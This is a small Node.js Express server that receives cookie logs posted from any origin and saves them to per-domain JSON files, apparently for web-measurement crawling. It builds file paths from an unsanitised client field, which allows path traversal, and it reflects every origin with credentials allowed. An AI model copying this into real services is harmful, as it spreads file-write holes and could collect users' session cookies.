const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const jsonfile = require('jsonfile');
const app = express();
const port = 3000;

let website = ['null'];

// Directory for storing logs
const outputDirectory = './output/';

// Ensure the output directory exists
if (!fs.existsSync(outputDirectory)) {
    fs.mkdirSync(outputDirectory, { recursive: true });
}

app.use(cors({ credentials: true, origin: true }));
app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
app.use(bodyParser.json());

// Insert or update cookie logs
async function insertCookieLogs(newHttpReq, visitingDomain) {
    const directory = `${outputDirectory}${visitingDomain}`;
    if (!fs.existsSync(directory)) {
        fs.mkdirSync(directory, { recursive: true });
    }
    const file = `${directory}/cookielogs.json`;

    jsonfile.readFile(file, (err, data) => {
        if (err && !err.toString().includes('ENOENT')) {
            console.error('Error reading file:', err);
            return;
        }
        const logs = data || [];
        logs.push(newHttpReq);

        jsonfile.writeFile(file, logs, { spaces: 2 }, function (err) {
            if (err) console.error('Error writing file:', err);
        });
    });
}

// Route to handle logging cookie data
app.post('/cookieLogs', (req, res) => {
    if (!req.body.visitingDomain) {
        res.status(400).send("Website identifier is required.");
        return;
    }
    insertCookieLogs(req.body, req.body.visitingDomain);
    res.send("Request logged successfully");
});


// Route to update website information
app.post('/complete', (req, res) => {
    if (!req.body.visitingDomain) {
        res.status(400).send("Website parameter is required.");
        return;
    }
    res.send(`Website set to ${req.body.visitingDomain}`);
});

app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
});